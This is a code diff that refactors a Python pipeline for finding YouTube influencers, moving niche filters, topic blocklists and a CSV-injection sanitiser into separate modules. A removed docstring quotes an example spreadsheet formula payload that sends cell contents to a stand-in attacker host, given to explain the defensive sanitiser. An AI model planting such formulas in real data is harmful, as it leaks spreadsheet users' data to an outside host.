@@ -57,8 +57,6 @@ from config import (
     DEFAULT_STATUS,
     SOURCE_LABEL,
     DAILY_QUOTA_BUDGET,
-    AIRTABLE_TABLE_HOME_THEATER,
-    AIRTABLE_TABLE_LIFESTYLE_SOFA,
     CANDIDATE_OVERSHOOT,
     DAILY_FLAGGED_CAP,
     DAILY_QUALIFIED_CAP,
@@ -72,197 +70,18 @@ from config import (
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 logger = logging.getLogger(__name__)
 
-# The subscriber floor sent to influencers.club's SERVER-SIDE
-# `number_of_subscribers` filter, expressed as a FRACTION of the niche's own
-# `min_avg_views` rather than an absolute number. Raised from a flat 2,000 on
-# 2026-08-14 and wired per-niche below the NICHES dict.
-#
-# This is the one legitimate use of a vendor statistic in the pipeline: it
-# decides which creators we PAY to look at, never what we believe about a
-# channel. Every number that gates, scores, or gets written still comes from the
-# YouTube Data API v3 (see influencer_discovery._to_candidate).
-#
-# Why 2,000 was wrong: discovery bills 0.01 per creator returned, and a channel
-# has to clear its niche's average AND have 70% of its recent videos over
-# MIN_VIEWS_PER_VIDEO to become a row. Against a 10,000 average that made 2,000
-# subscribers a 5x view-to-subscriber ratio — rare enough that the old floor
-# screened almost nothing out. We paid for those creators and then discarded
-# them at the view gate.
-#
-# Why a RATIO and not an absolute: every other qualification lever here
-# (min_avg_views, min_channel_age_months) is per-niche, because the two niches'
-# thresholds have already diverged and reconverged once (Lifestyle Sofa's view
-# floor was 2,000 before the unification). An absolute subscriber floor would
-# silently stop matching the arithmetic that justified it the moment a niche's
-# view floor moved, and no test would catch the drift. Deriving it means the
-# floor tracks its own niche automatically.
-#
-# Why 0.5 and not 1.0: the two directions of error are not symmetric. Too high
-# is a FALSE NEGATIVE — a real prospect the vendor never shows us, invisible and
-# unrecoverable. Too low just costs credits, which the run summary now reports
-# per row. A 2x view-to-subscriber ratio is ordinary for an engaged niche
-# audience, so a channel with half the view floor in subscribers is a genuine
-# prospect and must stay reachable. Tune against the drop-reason counts in a run
-# summary, not by intuition.
-DISCOVERY_SUBSCRIBER_FLOOR_RATIO = 0.5
+# EXCLUDED_TOPIC_TERMS, EXCLUDED_TOPIC_KEYWORDS, DISCOVERY_SUBSCRIBER_FLOOR_RATIO
+# and wire_discovery_filters() moved to niches.py (2026-08-14). They had to go
+# WITH the registry: wire_discovery_filters() mutates NICHES in place at import,
+# so leaving it here made `import niches` on its own yield a registry missing
+# keywords_not_in_description and number_of_subscribers — i.e. correctness that
+# depended on whether main happened to be imported first.
+from niches import EXCLUDED_TOPIC_TERMS  # noqa: E402
 
-# One entry per niche: its search keywords (drawn directly from the
-# "Types of Content Posting" > Primary section of each influencer
-# profiling brief, Cynthia Lim, updated 15 April 2024 — i.e. actual video
-# topics target creators publish, not demographic/psychographic traits,
-# those aren't searchable YouTube content) and which Airtable table its
-# discovered channels get pushed to. Re-tune keywords as new briefs come
-# in or results drift off-niche.
-NICHES = {
-    "Home Theater": {
-        "keywords": [
-            "home theater products review",
-            "man cave tour",
-            "entertainment room makeover",
-            "car and truck review",
-            "power tools review",
-            "sports podcast commentary",
-            "movie review and reaction",
-            "home theater tech setup",
-            "homesteading vlog",
-        ],
-        "table_name": AIRTABLE_TABLE_HOME_THEATER,
-        # Which of the base's EXTERNAL outreach tables belong to this niche,
-        # matched case-insensitively as a substring of the source table name in
-        # external_dedupe.EXTERNAL_TABLES. Spelled "Theatre" because that is how
-        # those tables spell it — the niche key is "Theater", which is exactly
-        # why this is an explicit field and not derived from the key.
-        #
-        # Only used to PRIORITISE the discovery exclude set under the vendor's
-        # 10,000-handle cap (see _external_priority); it never changes which
-        # candidates are deduped, only which exclusions fit in the request.
-        "external_source_hint": "Home Theatre",
-        # From the Home Theater brief (Cynthia Lim, 15 April 2024):
-        # "Has a Min 10k+ views on YouTube" and "Not a new channel".
-        # The 10,000 figure is now the floor BOTH niches run on, so this
-        # entry is unchanged by the 2026-08 criteria change — it is the one
-        # the other niche moved to. The threshold stays per-niche rather
-        # than becoming a shared constant so a niche can be given its own
-        # bar again without unpicking the gate.
-        "min_avg_views": 10_000,
-        "min_channel_age_months": 12,
-        # influencers.club discovery filters (the source that replaces
-        # search.list when INFLUENCERS_API_KEY is set — see run_niche). The
-        # products being promoted are home-theatre gear, so the creators worth
-        # reaching are: theatre enthusiasts (home cinema / AV / media rooms),
-        # homebodies (people who build their nights-in around home
-        # entertainment), and furniture enthusiasts (media-/living-room
-        # furnishing). Relevance is carried by the ai_search SEMANTIC query,
-        # not by `topics`: the yt-topics taxonomy has no leaf for "home" or
-        # "furniture", and pinning topics to Movies/Technology would EXCLUDE
-        # the furniture/homebody creators (YouTube files them under Lifestyle).
-        # Reword ai_search to steer the niche; it is a 3–150 char free-text
-        # field verified live 2026-08-13.
-        #
-        # gender="male": the primary target for home-theatre products is men.
-        # This is the CREATOR's gender, filtered server-side (accepted values
-        # verified live: 'any' | 'male' | 'female'). There is also a separate
-        # audience.gender filter (target creators whose AUDIENCE skews male) if
-        # audience composition ever matters more than the creator's own gender.
-        "discovery_filters": {
-            "profile_language": ["en"],
-            "gender": "male",
-            # WIDENED 2026-08-14 after measuring the addressable pool. The old
-            # query ("home theater and home cinema setups, media rooms, cozy
-            # homebody home entertainment, living room furniture and home
-            # furnishing") matched only 444 creators against Lifestyle Sofa's
-            # 7,647 — a 17x gap, and the reason this table stopped producing new
-            # prospects while the other kept filling. A fixed pool that small is
-            # consumed in a few runs, after which exclude_handles leaves almost
-            # nothing.
-            #
-            # Probed one filter at a time (limit=1, so 0.01 credits each) to find
-            # what was actually binding. Results, all with gender=male and
-            # subs>=5000 held constant:
-            #
-            #   current wording ......................  444
-            #   + projectors / AV receivers / soundbars  445   <- no effect
-            #   + man cave / gaming setup / home audio  2623   <- 5.9x
-            #   broad "home entertainment" wording      1743
-            #
-            # The technical AV vocabulary buys nothing; the LIFESTYLE framing is
-            # what opens the pool, because home-theatre buyers overlap heavily
-            # with man-cave and gaming-setup creators. Gender and the subscriber
-            # floor were the other candidates and are much weaker levers
-            # (dropping gender entirely: 444 -> 1572; subs 5000 -> 2000: 444 ->
-            # 635), so neither was touched — the male-creator preference stands.
-            #
-            # KEEP THIS UNDER 150 CHARACTERS. The vendor documents 3-150, and a
-            # 180-char version measured WORSE (1,039) than this 122-char one,
-            # which reads like silent truncation. Re-probe with the snippet above
-            # after any reword; do not assume more terms means a wider pool.
-            "ai_search": (
-                "home theater and home cinema, media room, man cave, gaming setup, "
-                "home audio, projector and TV setup, living room furniture"
-            ),
-            # `number_of_subscribers` is wired in below the NICHES dict, derived
-            # from this niche's own min_avg_views via
-            # DISCOVERY_SUBSCRIBER_FLOOR_RATIO — see that constant.
-            #
-            # A server-side "keywords_not_in_description" negation of the
-            # off-brand political / ASMR / firearms terms is wired in from
-            # EXCLUDED_TOPIC_TERMS after that dict is defined (it lives below
-            # this literal) — see EXCLUDED_TOPIC_KEYWORDS.
-        },
-    },
-    "Lifestyle Sofa": {
-        "keywords": [
-            "interior design and styling",
-            "home decor tour",
-            "DIY home makeover",
-            "day in the life stay at home mom",
-            "home cleaning and organizing",
-            "furniture review unboxing",
-            "cozy living room decor",
-            "country living home",
-            "minimalist home living",
-            "house tour apartment tour",
-            "seasonal home decor",
-        ],
-        "table_name": AIRTABLE_TABLE_LIFESTYLE_SOFA,
-        # See the Home Theater entry for what this does. "Lifestyle" matches
-        # "Lifestyle – Sofa Influencers" (1,949 handles), which fits under the
-        # cap with room to spare — so this niche's external re-bills go to zero.
-        "external_source_hint": "Lifestyle",
-        # RAISED from the brief's 2,000 to 10,000 in the 2026-08 criteria
-        # change, which put both niches on the same view floor. The brief
-        # (Cynthia Lim, 15 April 2024) says "Has min of 2k+ view on YouTube
-        # videos" — this deliberately overrides it, so don't "restore" the
-        # 2,000 from the brief without checking that the instruction to
-        # unify the two niches has actually been reversed.
-        #
-        # The brief sets no channel-age requirement, and that part still
-        # stands. Its Instagram thresholds (100k+ followers, 20k+ reel
-        # views) are out of scope — this pipeline only observes YouTube.
-        "min_avg_views": 10_000,
-        "min_channel_age_months": None,
-        # Fashion, lifestyle, travel, house tours, and home decor — and
-        # especially women-led channels. gender="female" filters the CREATOR
-        # server-side (values verified live: 'any' | 'male' | 'female').
-        # Relevance rides on ai_search rather than topics: "house tours" and
-        # "home decor" have no yt-topics leaf, and pinning topics to the
-        # Fashion/Tourism leaves that DO exist would exclude the decor /
-        # house-tour creators. Reword ai_search to steer it.
-        "discovery_filters": {
-            "profile_language": ["en"],
-            "gender": "female",
-            "ai_search": "fashion and lifestyle vlogs, travel, house tours, home decor and interior styling",
-            # As with Home Theater, `number_of_subscribers` is derived from this
-            # niche's own min_avg_views below the dict — so if this niche's view
-            # floor is ever un-unified back toward the brief's 2,000, its
-            # subscriber floor follows automatically instead of going stale.
-            #
-            # As above: the off-brand "keywords_not_in_description" negation is
-            # wired in from EXCLUDED_TOPIC_TERMS below — see
-            # EXCLUDED_TOPIC_KEYWORDS.
-        },
-    },
-}
+# NICHES lives in niches.py (extracted 2026-08-14) so outreach.py can read the
+# niche -> table mapping without importing this module and, with it, Playwright.
+# Re-exported because this module and several tests refer to `main.NICHES`.
+from niches import NICHES  # noqa: E402
 
 # Outer refill-round cap for the influencers.club discovery loop. discovery
 # paginates internally and stops when supply or its credit ceiling runs out;
@@ -560,158 +379,6 @@ DROP_QUOTA_EXHAUSTED = "quota_exhausted"
 # they disagree in exactly the case this gate was added for.
 DROP_NON_ENGLISH_DESCRIPTION = "non_english_description"
 
-# Whole categories a brand-partnership run must never surface, however well a
-# channel otherwise fits a niche: political commentary, ASMR, and firearms /
-# gun-review content. Discarded outright like the gates above (not flagged) —
-# the brief rules them out, so a human reviewing them is pure cost.
-#
-# Matched as WHOLE WORDS (case-insensitive) against the channel's OWN title
-# and About description only — its self-identification — never its video
-# descriptions, which would drag in false positives (a home-theater channel
-# reviewing a war film; a decor channel styling a "campaign" desk).
-#
-# The term lists are deliberately tuned against THIS pipeline's two niches,
-# where the obvious words are landmines:
-#   - firearms omits bare "gun"/"shotgun"/"shooting" ("nail/glue/spray gun"
-#     are DIY/furniture vocabulary; "shotgun" is a home-theater MICROPHONE),
-#     AND omits "pistol"/"revolver"/"rifle": Home Theater is audiophile-
-#     adjacent and Lifestyle Sofa covers fashion/thrift, so those collide
-#     with the Sex Pistols, the Beatles' "Revolver", and the verb "rifle
-#     through". The remaining firearm-specific terms still catch a gun-review
-#     channel, which will carry firearm/handgun/ammo/AR-15/glock/etc.
-#   - political omits "conservative"/"liberal" (everyday decor/design
-#     adjectives: "a conservative palette", "liberal use of throw pillows")
-#     and "parliament" (the funk band Parliament-Funkadelic).
-# Over-excluding costs one lead; under-excluding lets a banned category
-# through. Tune the sets if a real prospect is ever wrongly dropped.
-EXCLUDED_TOPIC_TERMS = {
-    "political": [
-        "politics", "political", "geopolitics", "election", "elections",
-        "democrat", "democrats", "republican", "republicans", "libertarian",
-        "leftist", "left-wing", "right-wing", "congress", "senate",
-        "communism", "socialism", "MAGA",
-    ],
-    "asmr": ["asmr", "tingles", "mouth sounds"],
-    "firearms": [
-        "firearm", "firearms", "handgun", "handguns", "ammo", "ammunition",
-        "AR-15", "AK-47", "glock", "concealed carry", "second amendment",
-        "gunsmith", "ballistics",
-    ],
-    # --- WRONG VERTICAL (2026-08-15) -------------------------------------
-    # Added after two channels reached the Home Theater table that no gate
-    # could have stopped, because no gate asks about RELEVANCE: fit is
-    # delegated entirely to influencers.club's ai_search, which was widened
-    # 5.9x on 2026-08-14 for pool size and never re-checked for precision.
-    #
-    # This is a BLOCKLIST, and it is honestly whack-a-mole — it catches the
-    # verticals named here and nothing else. A general relevance gate was
-    # built and MEASURED first, and rejected on the numbers:
-    #
-    #   - On BIOS: unusable. Four tracked channels have no vocabulary at all
-    #     ("Hi!", "Collab: <email>", a bare email address), so a
-    #     must-match-a-term rule discards real prospects on an empty bio.
-    #   - On the 50 VIDEO TITLES (free — already fetched for the duplicate
-    #     filter): better, but it does not separate the two groups. Measured
-    #     over all 38 Home Theater rows, the racing channel scored 2/50 and
-    #     WOULD have been caught, but the logging channel scored 25/50 (its
-    #     titles carry "furniture", "home decor", "interior" from woodworking)
-    #     and would NOT, while "Jasper Tran - House Design Ideas" scored 0/50
-    #     and a real prospect would have been discarded. A threshold that
-    #     catches one of the two reported channels costs two false positives
-    #     and still misses the other.
-    #
-    # Both channels ARE caught cleanly by their own bios, which is what these
-    # terms read. Terms are kept narrow on purpose — each one also goes to the
-    # vendor as keywords_not_in_description, so a sloppy term silently shrinks
-    # the discovery pool as well as dropping rows.
-    "sim_racing": [
-        # Game TITLES, not "racing": "car and truck review" is a deliberate
-        # Home Theater keyword, and a creator who builds a sim rig in their
-        # man cave is a legitimate prospect. What is off-niche is gameplay
-        # content, and a gameplay channel names the games in its bio.
-        "beamng", "assetto corsa", "iracing", "gran turismo",
-    ],
-    "forestry": [
-        # "logging truck" and not bare "logging": the word-boundary match
-        # already spares "vlogging", but "logging" alone would still fire on
-        # "logging my progress". "timber"/"chainsaw" are deliberately OMITTED
-        # — "timber furniture" is ordinary AU/UK furniture vocabulary for
-        # Lifestyle Sofa, and "power tools review" is a Home Theater keyword.
-        "logging truck", "logging trucks", "forestry", "sawmill",
-        "tree felling",
-    ],
-}
-
-# The same off-brand terms, flattened for influencers.club discovery's
-# SERVER-SIDE negation filter (see the wiring loop below). Sent as the
-# vendor's `keywords_not_in_description`, which withholds any creator whose
-# profile bio carries one of these words/phrases — so the whole political /
-# ASMR / firearms categories are never RETURNED, and (at 0.01 credits per
-# returned creator) never BILLED. This is the credit-saving move
-# exclude_handles already makes for already-known creators: filtering these
-# out locally after the response, the way excluded_topic_reason() does, cannot
-# refund the discovery credit the vendor has already charged.
-#
-# Reuses EXCLUDED_TOPIC_TERMS verbatim rather than a hand-kept copy, so the
-# server pre-filter and the local backstop can never drift. Safe to reuse
-# because the vendor field matches the SAME way the local gate does — case-
-# insensitive, on whole words and multi-word phrases (verified live
-# 2026-08-14, the way gender's accepted values were: a wrong-type probe
-# names the field, and keywords_in/keywords_not partition the result set
-# exactly — P + N == base total). So the landmine words that gate deliberately
-# omits ("gun"/"rifle"/"conservative"/…) stay omitted here too; "MAGA" does
-# not match "magazine".
-EXCLUDED_TOPIC_KEYWORDS = sorted(
-    {term for terms in EXCLUDED_TOPIC_TERMS.values() for term in terms}
-)
-
-def wire_discovery_filters(niches: dict) -> None:
-    """
-    Fill in the server-side discovery filters that can't be written inline in
-    the NICHES literal, because they derive from things defined after it.
-
-    Called at import, immediately below. A named function rather than a
-    top-level for-loop for two reasons: a test can hand it a deliberately
-    misconfigured niche (a bare loop here could only be exercised by
-    re-importing the module), and it needs no `del` of throwaway loop names
-    afterwards.
-
-    Mutates `niches` in place. Every lookup is guarded with `in` rather than
-    indexed, and that is load-bearing rather than defensive noise: this runs
-    while `import main` is still executing, so a KeyError here kills the run
-    before logging is configured, before the blocklist fetch, before any niche
-    is attempted. That is strictly worse than the failure this project
-    deliberately designed for, where run_niche() checks the same keys against
-    REQUIRED_NICHE_KEYS and skips only the offending niche with a logged error.
-    Leaving a filter unset routes a misconfigured niche back to that check.
-    """
-    for niche_config in niches.values():
-        filters = niche_config.get("discovery_filters")
-        if filters is None:
-            continue  # search.list-only niche; nothing to wire
-
-        # A per-niche list() copy, not the shared constant itself: each niche
-        # owns its own list, so a future per-niche exclusion edit can't mutate
-        # the other niche's filter (or EXCLUDED_TOPIC_KEYWORDS) in place. The
-        # copies are still all derived from EXCLUDED_TOPIC_TERMS at import, so
-        # the no-drift guarantee above is unaffected.
-        filters["keywords_not_in_description"] = list(EXCLUDED_TOPIC_KEYWORDS)
-
-        # The subscriber floor, derived from THIS niche's own view floor so the
-        # two can never drift apart — see DISCOVERY_SUBSCRIBER_FLOOR_RATIO.
-        # int(), because the vendor's number_of_subscribers.min is an integer
-        # field and a float would be a type error at the API rather than here.
-        if "min_avg_views" in niche_config:
-            filters["number_of_subscribers"] = {
-                "min": int(niche_config["min_avg_views"] * DISCOVERY_SUBSCRIBER_FLOOR_RATIO)
-            }
-
-
-# The local excluded_topic_reason() gate in process_candidate STAYS as the
-# deterministic backstop to the keywords_not_in_description filter wired above:
-# it also reads the channel TITLE (not just the bio), and it is the only tier
-# that covers the search.list fallback path the server-side filter never sees.
-wire_discovery_filters(NICHES)
 
 
 # One pattern per category, matching any listed term on a word boundary.
@@ -1162,51 +829,18 @@ def push_until_full(
 # rather than as text. The tab and CR are in here because a leading
 # whitespace character is stripped by some importers before the formula
 # check runs, which puts the "=" back at the front.
-SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
-
-
-def csv_safe(value: str) -> str:
-    """
-    Neutralise a value that a spreadsheet would otherwise run as a formula.
-
-    WHY this exists at all — it looks like a pointless prefix until you
-    follow the value to where a human actually reads it:
-
-      - Airtable is NOT a formula-eval context for these values, so nothing
-        executes when the record is pushed. That is why this is easy to
-        mistake for dead code and "clean up". Don't.
-      - But this pipeline's entire purpose is to hand rows to a HUMAN
-        reviewer, and the normal thing a reviewer does with an Airtable view
-        is export it to CSV and open it in Excel or Google Sheets. THAT is a
-        formula-eval context: a cell starting with =, +, -, @ or a leading
-        tab/CR is parsed as a formula, not as text.
-      - Two of the fields we write are attacker-influenced. "Channel Name"
-        is whatever the channel owner typed, and "Email" can come out of
-        browser_email.py, which reads arbitrary third-party websites. A
-        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
-        a live payload in the reviewer's spreadsheet — classic CSV (formula)
-        injection, and the reviewer's machine is the target, not ours.
-
-    A leading apostrophe is the fix because it is what spreadsheets
-    themselves use to mean "this cell is literal text": Excel and Sheets
-    both consume it on import and display the original string.
-
-    Deliberately conservative about what it touches:
-
-      - Only the FIRST character is examined. "Bob's Home Theater" and
-        `a-b@c.com` contain dangerous characters but cannot start a formula,
-        and mangling ordinary channel names/addresses would make the field
-        wrong for every honest candidate to defend against a rare one.
-      - Non-strings (and empty strings/None) pass straight through with
-        their type intact. Several record fields are genuinely numeric and
-        Airtable's Number fields reject strings, so stringifying here would
-        break the push for every record.
-    """
-    if not isinstance(value, str) or not value:
-        return value
-    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
-        return "'" + value
-    return value
+# csv_safe() and its inverse live in text_safety.py (extracted 2026-08-14) so
+# outreach.py can reuse them without importing this module — `import main`
+# executes the NICHES construction and drags in discovery, enrichment,
+# influencers and browser_email, i.e. Playwright, into a process whose only
+# job is rendering an email. Re-exported because this module's own call sites
+# and several tests refer to `main.csv_safe`.
+# Re-exported ONLY for existing callers: this module still calls csv_safe(),
+# backfill_missing_emails.py imports it from here, and tests/test_csv_injection.py
+# imports SPREADSHEET_FORMULA_PREFIXES from here. csv_unsafe() is deliberately
+# NOT re-exported — nothing reaches it through main, and new code should import
+# from text_safety directly rather than growing this compatibility surface.
+from text_safety import SPREADSHEET_FORMULA_PREFIXES, csv_safe  # noqa: E402,F401
 
 
 def process_candidate(
